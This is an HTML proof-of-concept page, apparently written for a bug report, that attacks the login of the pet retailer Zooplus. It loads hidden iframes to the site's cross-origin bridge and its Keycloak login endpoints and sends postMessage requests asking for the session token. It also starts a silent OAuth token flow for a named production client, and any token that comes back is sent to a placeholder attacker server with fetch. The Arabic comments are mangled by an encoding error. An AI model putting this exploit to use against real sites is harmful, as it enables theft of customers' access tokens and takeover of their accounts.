<!DOCTYPE html>
<html>
<head>
    <title>Zooplus Token Leak PoC</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        .log-entry { border-bottom: 1px solid #333; padding: 5px; margin-bottom: 5px; }
        .token-highlight { color: #ff00ff; font-weight: bold; word-break: break-all; }
        iframe { display: none; }
    </style>
</head>
<body>
    <h2>[!] Zooplus Identity Hijacking Terminal</h2>
    <div id="status">Initializing Attack Vectors...</div>
    <div id="console"></div>

    <iframe id="bridge_iframe" src="https://stm.zooplus.com/sw_iframe.html?origin=https://YOUR-DOMAIN.com"></iframe>
    
    <iframe id="auth_iframe" src="https://login.zooplus.com/auth/realms/zooplus/protocol/openid-connect/login-status-iframe.html"></iframe>

    <script>
        const logBox = document.getElementById('console');
        const statusBox = document.getElementById('status');

        function log(msg, isCritical = false) {
            const div = document.createElement('div');
            div.className = 'log-entry';
            div.innerHTML = `<span style="color: ${isCritical ? 'red' : '#00ff00'}">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
            logBox.prepend(div);
        }

        window.addEventListener("message", function(event) {
            // Ø±ØµØ¯ Ø£ÙŠ Ø±Ø³Ø§Ø¦Ù„ Ù‚Ø§Ø¯Ù…Ø© Ù…Ù† Ù†Ø·Ø§Ù‚Ø§Øª zooplus
            if (event.origin.includes("zooplus.com")) {
                log(`RECEIVED from ${event.origin}: ` + JSON.stringify(event.data));

                // Ø¥Ø°Ø§ ÙƒØ§Ù†Øª Ø§Ù„Ø±Ø³Ø§Ù„Ø© ØªØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ø§Ù„ØªÙˆÙƒÙ† Ø£Ùˆ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù„Ø³Ø©
                if (event.data.token || event.data.access_token) {
                    log(`ðŸŽ¯ SUCCESS! Access Token Leaked: <span class="token-highlight">${event.data.token || event.data.access_token}</span>`, true);
                    statusBox.innerText = "TOKEN CAPTURED!";
                    
                    // ØªÙ‡Ø±ÙŠØ¨ Ø§Ù„ØªÙˆÙƒÙ† ÙÙˆØ±Ø§Ù‹ Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ù…Ù‡Ø§Ø¬Ù…
                    fetch(`https://YOUR-ATTACKER-SERVER.com/collect?token=${event.data.token}`);
                }

                // Ø¥Ø°Ø§ Ø­ØµÙ„Ù†Ø§ Ø¹Ù„Ù‰ Ø§Ù„Ù€ ClientIDØŒ Ù†Ø¨Ø¯Ø£ Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø«Ø§Ù†ÙŠØ©
                if (event.data.clientId) {
                    log(`Found ClientID: ${event.data.clientId}. Attempting Session Hijacking...`);
                    triggerKeycloakProbe(event.data.clientId);
                }
            }
        });

        function triggerKeycloakProbe(clientId) {
            const authWin = document.getElementById('auth_iframe').contentWindow;
            // Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø¬Ø¨Ø§Ø± Keycloak Ø¹Ù„Ù‰ ÙƒØ´Ù Ø§Ù„Ø­Ø§Ù„Ø©
            authWin.postMessage(clientId + " check-session", "https://login.zooplus.com");
        }

        // Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø­Ø¨ Ø§Ù„ØªÙˆÙƒÙ† Ø¹Ø¨Ø± Ø§Ù„Ø¬Ø³Ø± Ø¨Ø¹Ø¯ Ø§Ù„ØªØ­Ù…ÙŠÙ„
        document.getElementById('bridge_iframe').onload = function() {
            log("Bridge loaded. Injecting Request for frontendAuthorizer...");
            const bridgeWin = document.getElementById('bridge_iframe').contentWindow;
            
            // Ù†Ø±Ø³Ù„ Ø·Ù„Ø¨Ø§Ù‹ Ù„Ù„Ø¬Ø³Ø± ÙŠØ­Ø§ÙƒÙŠ Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠ Ù„Ø³Ø­Ø¨ Ø§Ù„ØªÙˆÙƒÙ†
            bridgeWin.postMessage({
                type: "GET_AUTHORIZATION",
                property: "frontendAuthorizer.token" 
            }, "*");
        };

        // Ù…Ø­Ø§ÙƒØ§Ø© Ø¹Ù…Ù„ÙŠØ© Silent Refresh Ù„Ø³Ø­Ø¨ ØªÙˆÙƒÙ† Ø¬Ø¯ÙŠØ¯
        setTimeout(() => {
            log("Attempting Silent Authentication Flow via hidden frame...");
            const silentFrame = document.createElement('iframe');
            silentFrame.src = "https://login.zooplus.com/auth/realms/zooplus/protocol/openid-connect/auth?client_id=shop-myzooplus-prod-zooplus&response_type=token&scope=openid&prompt=none&redirect_uri=https://stm.zooplus.com/sw_iframe.html";
            document.body.appendChild(silentFrame);
        }, 5000);

    </script>
</body>
</html>
